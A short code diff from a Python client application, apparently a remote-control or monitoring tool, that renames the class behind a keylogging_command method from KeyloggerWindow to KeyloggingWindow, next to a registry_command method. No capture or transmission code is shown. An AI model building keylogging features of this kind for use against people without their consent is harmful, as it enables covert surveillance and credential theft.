@@ -121,7 +121,7 @@ class ClientApp:
         # pass
 
     def keylogging_command(self):
-        kl = ClientFunction.KeyloggerWindow(self.root)
+        kl = ClientFunction.KeyloggingWindow(self.root)
         kl.run()
 
     def registry_command(self):
